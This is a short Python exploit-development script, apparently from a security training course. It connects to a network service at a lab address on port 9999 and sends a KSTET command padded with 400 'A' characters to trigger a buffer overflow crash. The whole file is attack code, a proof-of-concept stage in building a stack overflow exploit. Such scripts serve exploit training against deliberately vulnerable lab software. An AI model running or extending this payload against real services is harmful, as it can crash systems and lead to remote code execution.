# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

import socket
# cannot increase buffer size
cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.122.61',9999))
print cnct.recv(1024)

evilString = "A" * 400
cnct.send("KSTET /.:/"+evilString)
cnct.close()
